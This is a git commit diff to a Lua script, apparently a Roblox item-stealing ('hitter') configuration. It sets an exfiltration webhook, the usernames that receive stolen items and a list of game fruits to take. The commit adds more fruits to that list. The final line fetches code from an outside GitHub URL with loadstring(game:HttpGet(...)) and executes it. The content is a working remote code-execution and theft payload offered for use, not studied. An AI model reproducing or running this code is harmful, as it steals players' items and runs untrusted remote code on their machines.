01f0d1a22b4838588b54e5c2c5e5a6bd96d02027
Script.git <basik1394@gmail.com>
2025-04-20 14:27:44 +0500

    Quarter.lua

--- Quarter.lua
+++ Quarter.lua
@@ -1,5 +1,5 @@
 Webhook = "https://webhook-protect.vercel.app/api/webhook?id=cWdMU3ZoT1h1YUh2UTFNdl9xWjdDQTp4T25ad0hteUNrbXVRRXUyaExHZjlPRDRjNHVwSGU2aTZwTUlVMnVweE5penk1VjhzdHo4S1N2Zk9NQU42WGF6VVBxQ2NMa1lwT3VUWXAwZXRtNkVvQnR5NURtS01SblVWUEUzWlFrQVY0alJvTktCVnYxU1kzTXVkZDUxU2ZacjB5bWtnVEVXZlFsNUFpV0RURDUteTEwUXozQ1pEWVp2UmNqa2pEV3BhUGs" -- << Your Webhook
 Usernames = {"basil2900", "gamertuned1"} -- << Your username(-s).
-FruitsToHit = {"Kitsune-Kitsune", "Leopard-Leopard", "Yeti-Yeti", "Gas-Gas", "Gravity-Gravity", "Dough-Dough", "Ghost-Ghost"} -- << Fruits you want
+FruitsToHit = {"Dragon-Dragon", "Kitsune-Kitsune", "Leopard-Leopard", "Yeti-Yeti", "Gas-Gas", "Gravity-Gravity", "Dough-Dough", "Ghost-Ghost", "Control-Control", "Ice-Ice"} -- << Fruits you want
 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/reasonrekt/stuFF/refs/heads/main/wowowo"))()
